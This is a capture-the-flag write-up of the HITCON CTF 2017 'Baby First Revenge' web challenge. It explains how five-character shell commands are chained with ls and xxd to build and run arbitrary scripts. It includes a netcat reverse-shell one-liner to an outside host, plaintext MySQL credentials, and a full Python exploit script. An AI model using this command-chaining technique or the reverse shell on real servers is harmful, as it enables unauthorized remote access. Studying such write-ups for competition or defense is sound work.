---
layout: post
title: "Hitcon CTF 2017 Quals: Baby First Revenge (web 172)"
author: yrlf
categories: writeup
tags: [cat/web, tool/python-requests, tool/ipython]
---

* **Category:** web
* **Points:** 172
* **Description:**

> Do you remember [BabyFirst](https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst) from HITCON CTF 2015?
>
> This is the harder version!
> 
> [http://52.199.204.34/](http://52.199.204.34/)

## Write-up

This was the first challenge I tried this CTF, and it was a really fun one.

```php
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
```

The website is a PHP script that allows you to execute shell commands up to 5 characters in length
in a folder, where we have write access. We can also request the files there and download them.

I knew that bash allows you to create empty files with `>file`, so we used that as a starting point.

At first, we tried writing text into files with `ls>y`, but that didn't lead us very far, because the shell creates the file `y` before `ls` runs, so `y` would contain lots of unwanted `y` characters between our filenames

After quite a long time, we found out, that `xxd -p -r` ignores all non-hex characters, and that we could use `ls>>y` to slowly build up a file containing arbitrary hex digits and lots of `y` characters.

And for executing `xxd -p -r infile outfile` we just create a `-p` and a `-r` file and execute `xxd *`. We just have to make sure that our infile and outfile sort after `-p` and `-r`.

for example, writing "HELLO" to a file would work like this

```sh
>4845
ls>>y
rm 4*
>4c4c
ls>>y
rm 4*
>4f
ls>>y
rm 4*
>z
>-p
>-r
xxd *
```

I then wrote a script that writes arbitrary files and executes them as a shell command with `sh z`.

We then executed a reverse shell with

```sh
mkfifo f; nc <host> <port> <f | bash >f 2>f
```

and looked for the flag.

We found a `README.txt` in the home directory of user fl4444g, which contained this:

```
Flag is in the MySQL database
fl4444g / SugZXUtgeJ52_Bvr
```

After that, we used mysql to get the flag
```
$ mysql -ufl4444g -pSugZXUtgeJ52_Bvr
mysql> SHOW DATABASES;
Database
information_schema
fl4gdb
mysql> use fl4gdb;
SHOW TABLES;
Tables_in_fl4gdb
this_is_the_fl4g
mysql> SELECT * FROM this_is_the_fl4g;
secret
hitcon{idea_from_phith0n,thank_you:)}
```

## Script

The script we used (via ipython "run script") to get a shell on the system.

```python3
import requests as rq
import hashlib as h
import binascii as ba

url = "http://52.199.204.34/"
ipify = "https://api.ipify.org"

def get_ip():
    r = rq.get(ipify)
    return r.text

folder = h.md5(b"orange" + get_ip().encode()).hexdigest()

def reset():
    rq.get(url, params = {
        "reset": 1
    })

def cmd(c):
    rq.get(url, params = {
        "cmd": c
    })

def read(f):
    r = rq.get(url + "sandbox/" + folder + "/" + f)
    if r.status_code == 200:
        return r.text

def long_cmd(cmd_text):
    reset()
    cmd_bytes = cmd_text.encode()
    for i in range(0, len(cmd_bytes), 2):
        cur_bytes = cmd_bytes[i:i + 2]
        print("writing '{}'".format(cur_bytes.decode()))
        hex_chars = ba.hexlify(cur_bytes).decode()
        cmd(">" + hex_chars)
        cmd("ls>>y")
        cmd("rm " + hex_chars[0] + "*")
    cmd(">z")
    cmd(">-p")
    cmd(">-r")
    cmd("xxd *")
    cmd("sh z")
    return read("o")

def shell(cmd_text):
    print(long_cmd(cmd_text))

def rshell(host, port):
    long_cmd("mkfifo f; nc {} {} <f | bash >f 2>f".format(host, port))
```
